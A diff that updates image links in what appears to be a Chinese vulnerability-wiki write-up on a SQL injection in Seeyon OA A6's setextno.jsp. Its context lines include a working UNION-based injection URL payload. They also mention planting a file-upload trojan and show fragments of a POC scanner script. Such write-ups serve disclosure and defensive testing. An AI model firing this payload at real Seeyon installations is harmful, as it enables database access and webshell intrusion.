@@ -24,11 +24,11 @@
 http://xxx.xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# 
 ```
 
-![](image/zhiyuan-37.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-37.png)
 
 查看web路径
 
-![](image/zhiyuan-38.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-38.png)
 
 写入文件上传木马
 
@@ -38,7 +38,7 @@ http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(9999
 
 剩下的步骤参考另一篇 **致远OA A6 test.jsp SQL注入漏洞**
 
-![](image/zhiyuan-40.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-40.png)
 
 ## 漏洞利用POC
 
@@ -97,7 +97,7 @@ if __name__ == '__main__':
     Scan(file_name)
 ```
 
-![](image/zhiyuan-39.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-39.png)
 
 ## Goby & POC
 
@@ -107,4 +107,4 @@ if __name__ == '__main__':
 >
 > Seeyon_OA_A6_setextno.jsp_SQL_injection
 
-![](image/zhiyuan-43.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-43.png)
